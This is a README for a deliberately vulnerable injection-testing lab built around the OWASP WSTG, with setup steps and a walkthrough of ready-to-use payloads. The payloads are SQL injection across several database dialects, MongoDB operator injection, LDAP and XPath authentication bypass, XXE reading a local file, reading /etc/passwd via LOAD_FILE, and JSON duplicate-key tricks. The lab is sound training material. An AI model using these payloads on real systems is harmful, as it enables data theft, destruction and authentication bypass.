# Machine 04 — Injection: Datastore (SQL / NoSQL / LDAP / XML / XPath / JSON)

> **WARNING — INTENTIONALLY VULNERABLE TRAINING TARGET.**
> This machine is deliberately broken for authorised security testing / training
> (OWASP WSTG coverage lab) only. All data is synthetic. Ports are published on
> loopback only; datastores live on an `internal: true` network. Never expose
> this to untrusted networks and never attack anything outside this range.

## WSTG coverage

| ID | Test | Dialect / surface | Engine | Status |
|---|---|---|---|---|
| WSTG-INJT-05 | SQL Injection (9 docs) | see per-dialect table below | mixed | 05.1 + 05.5 degraded (engine substitutes), rest faithful |
| WSTG-INJT-06 | LDAP Injection | `/ldap/login` | real OpenLDAP 2.6 | faithful |
| WSTG-INJT-07 | XML Injection | `/xml/order`, `/xml/parse` | lxml | faithful (XXE file:// only, network disabled) |
| WSTG-INJT-09 | XPath Injection | `/xpath/login` | lxml over XML user store | faithful |
| WSTG-INJT-26 | JSON Parser Differentials | `:8401/json/transfer` → `/json/backend` | two real parsers/proxies | faithful |

### INJT-05 dialects

| Sub-doc | Endpoint | Engine | Techniques |
|---|---|---|---|
| 05.1 Oracle | `/pls/lab/WEB_USERS.show?p_id=` / `.find?p_name=` | **degraded**: PostgreSQL behind a mod_plsql/ORDS-style gateway | DAD routing, anonymous PL/SQL block generation, dynamic-SQL concatenation in the package body, UNION extraction |
| 05.2 MySQL | `/mysql/products?id=`, `/mysql/search?q=`, `/mysql/stacked?id=`, `/mysql/file?id=` | real `mysql:8.4` | UNION, boolean-blind, stacked queries, `LOAD_FILE` |
| 05.3 SQL Server | `/mssql/products?id=`, `/mssql/stacked?id=`, `/mssql/slow?id=` | real MSSQL 2022 (`linux/amd64` emulation) | UNION, batched queries, `WAITFOR DELAY` time-based |
| 05.4 PostgreSQL | `/pg/label?text=`, `/pg/items?name=`, `/pg/slow?id=` | real `postgres:16-alpine` | `\|\|` concatenation context, UNION, `pg_sleep` time-based |
| 05.5 MS Access | `/access/products?name=` | **degraded**: Jet-dialect facade over SQLite | `IIF()`, `TOP n`, `*`/`?` wildcards, `#date#` literals, `MID()`, `;`-stacked queries |
| 05.6 NoSQL | `/nosql/login` (POST JSON / GET brackets), `/nosql/where?q=` | real `mongo:7` | operator injection `{"$gt":""}`, query-string `pass[$gt]=`, `$where` JS injection |
| 05.7 ORM | `/orm/users?name=&sort=` | SQLAlchemy 2.x on PostgreSQL | `filter(text(...))` UNION, `order_by(text(...))` boolean differential |
| 05.8 Client-side | `/clientsql/?name=` | alasql vendored same-origin, runs in the browser | URL param concatenated into client-side SQL; debug sink (`window.__sqlDebug` + `POST /clientsql/sink`) |

Degradation reasons (also in `manifest.json`): `gvenzl/oracle-xe:21-slim`
exists on the registry mirror but is **amd64-only**, and the Oracle engine
cannot run on arm64 (unsupported under Rosetta emulation), so the *PL/SQL
Gateway surface* described in the WSTG sub-doc is implemented faithfully over
PostgreSQL. There is no Linux Jet/ACE engine, so Access-style SQL is parsed and
translated to a real embedded SQLite engine.

## Topology & ports

```
host ── 127.0.0.1:8400 ── app (Flask, all vulnerable endpoints)     [edge+backend]
host ── 127.0.0.1:8401 ── jsonfront (first-wins JSON validator)     [edge+backend]
                          mysql / postgres / mongo / ldap / mssql   [backend, internal:true]
```

| Port | Service | Purpose |
|---|---|---|
| 8400 | app | primary vulnerable application (all endpoints) |
| 8401 | jsonfront | INJT-26 front proxy/validator |

Datastores are **not** published. MSSQL runs under amd64 emulation and can take
1–3 minutes to become healthy; `startup_timeout` is 600 s.

## Run

```bash
cd machines/04-injection-datastore
docker compose up --build -d
docker compose ps          # wait until healthy
```

## Verify (isolated venv)

```bash
# from the repo root:
python3 -m venv machines/04-injection-datastore/verify/.venv
machines/04-injection-datastore/verify/.venv/bin/pip install -r machines/04-injection-datastore/verify/requirements.txt
machines/04-injection-datastore/verify/.venv/bin/python -m playwright install chromium  # optional; probe auto-installs
machines/04-injection-datastore/verify/.venv/bin/python tools/runner.py machines/04-injection-datastore
```

The 05.8 probe drives real headless Chromium (Playwright) against the shipped
alasql page and asserts both the in-page executed statement and the server-side
sink. All other probes are stdlib-only. Probes are idempotent (the MySQL
stacked payload drops/recreates its own `exfil` table; sink tokens are random).

## How to attack this (per test)

### INJT-05 / 05.2 MySQL
```
# UNION extraction of the seeded secret row
GET /mysql/products?id=0 UNION SELECT 1,secret,3 FROM vault
# boolean-blind (row count differs, page shape identical)
GET /mysql/search?q=%' AND (SELECT SUBSTRING(secret,1,9) FROM vault LIMIT 1)='WSTG-M04{' -- 
# stacked queries (multi-statement enabled)
GET /mysql/stacked?id=0; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil AS SELECT secret FROM vault; SELECT secret FROM exfil
# LOAD_FILE (secure_file_priv disabled, FILE granted to webapp)
GET /mysql/file?id=0 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3
```

### INJT-05 / 05.4 PostgreSQL
```
GET /pg/label?text=x' || (SELECT secret FROM vault LIMIT 1) || '
GET /pg/items?name=' UNION SELECT 1,secret FROM vault--
GET /pg/slow?id=1 AND (SELECT pg_sleep(3)) IS NULL      # ~3 s response
```
**Escalation discussion (not executed):** the app connects as the
non-superuser `webapp` role. If it connected as a superuser, stacked
`COPY (SELECT '') TO PROGRAM 'id'` (or `CREATE FUNCTION ... plpythonu`) would
turn this injection into OS command execution. The lab deliberately denies
that path: `COPY ... TO PROGRAM` as `webapp` fails with *permission denied*.

### INJT-05 / 05.3 SQL Server
```
GET /mssql/products?id=0 UNION SELECT 1,secret,3 FROM vault
GET /mssql/stacked?id=0; SELECT secret FROM vault
GET /mssql/slow?id=1; WAITFOR DELAY '00:00:03'
```
Escalation discussion: with `sa` (as here) an attacker could enable
`xp_cmdshell` via stacked `sp_configure` — deliberately **not** exercised by
the lab; the batched-query primitive that makes it possible is demonstrated.

### INJT-05 / 05.1 Oracle (PL/SQL Gateway facade)
```
GET /pls/lab/WEB_USERS.show?p_id=0 UNION SELECT 1,secret,'x' FROM ora_vault
GET /pls/lab/WEB_USERS.find?p_name=x' OR '1'='1
```
The response shows the generated anonymous block
`BEGIN WEB_USERS.show(p_id => '...'); END;` and the dynamic SQL the package
body builds by concatenation — the exact mod_plsql weakness class. On a real
Oracle engine the same input would reach `EXECUTE IMMEDIATE` inside the
package; `UTL_HTTP`/`DBMS_LOCK.SLEEP` are the Oracle-specific escalation/time
primitives (substituted here by PostgreSQL equivalents).

### INJT-05 / 05.5 MS Access (Jet facade)
```
# stacked queries (Jet has no comment syntax - balance the trailing quote)
GET /access/products?name=zzz'; SELECT secret FROM vault; SELECT * FROM products WHERE name LIKE '
# IIF() boolean-blind with Access '*' wildcards and MID()
GET /access/products?name=zzz*' OR IIF((SELECT MID(secret,1,4) FROM vault)='WSTG',1,0) OR 'a'='a
# #date# literals and TOP n are translated too
GET /access/products?name=zzz' OR order_date>#2024-01-01# OR 'a'='a
```

### INJT-05 / 05.6 NoSQL (MongoDB)
```
POST /nosql/login   {"user":"admin","pass":{"$gt":""}}          # operator injection
GET  /nosql/login?user=admin&pass[$gt]=                          # bracket notation
GET  /nosql/login?user[$gt]=&pass[$gt]=                          # auth bypass, first user
GET  /nosql/where?q=x' || (this.secret||'').indexOf('WSTG')===0 || '   # $where JS
```

### INJT-05 / 05.7 ORM (SQLAlchemy)
```
GET /orm/users?name=' UNION SELECT id,secret,'admin' FROM orm_vault--
GET /orm/users?sort=(CASE WHEN (SELECT secret FROM orm_vault LIMIT 1) LIKE 'WSTG-M04{orm%' THEN username ELSE id::text END)
# row order flips between the true and false condition -> blind ORDER BY extraction
```

### INJT-05 / 05.8 Client-side SQL (alasql)
Open in a browser:
```
/clientsql/?name=nobody' UNION SELECT secret,'x' FROM vault -- 
```
The page concatenates `name` into `SELECT name,role FROM users WHERE name =
'...'` executed by alasql *in the browser*; the vault row is rendered.
`window.__sqlDebug` and `POST /clientsql/sink` record the exact executed
statement + rows (read back with `GET /clientsql/sink?token=...`).

### INJT-06 LDAP
```
GET /ldap/login?uid=alice&password=wrong          # 0 entries (baseline)
GET /ldap/login?uid=*)(uid=*))(|(uid=*&password=x # all entries, passwords + admin secret
GET /ldap/login?uid=*&password=*                  # wildcard enumeration
```
Filter built as `(&(uid=<uid>)(userPassword=<password>))` — no escaping.

### INJT-07 XML
```
POST /xml/order  item=Widget</item><price>0</price><item>x&price=100&qty=2
# envelope gains a second <price>; business logic trusts the last one: total 200 -> 0

POST /xml/parse
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///app/data/xxe-secret.txt">]><r>&xxe;</r>
# external entity expands to the seeded secret (file:// only; no_network=True)
```

### INJT-09 XPath
```
GET /xpath/login?user=admin&pass=wrong            # 401
GET /xpath/login?user=' or '1'='1&pass=' or '1'='1 # 200, all 3 users incl. admin secret
```

### INJT-26 JSON Parser Differentials
```
POST :8401/json/transfer  {"role":"admin","action":"read_secret"}
# 403 - front (first-wins parser) rejects admin claims from external callers

POST :8401/json/transfer  {"role":"user","action":"read_secret"}
# passes the front, but the backend grants nothing (role=user) -> 403

POST :8401/json/transfer  {"role":"user","role":"admin","action":"read_secret"}
# 200 - front sees role=user and forwards the RAW bytes; backend (json.loads,
# last-wins) sees role=admin and returns the secret

POST :8401/json/transfer  {"role":"user","ro\u006ce":"admin","action":"read_secret"}
# same differential via unicode-escaped key matching
```

## Reset

```bash
docker compose down -v && docker compose up --build -d
```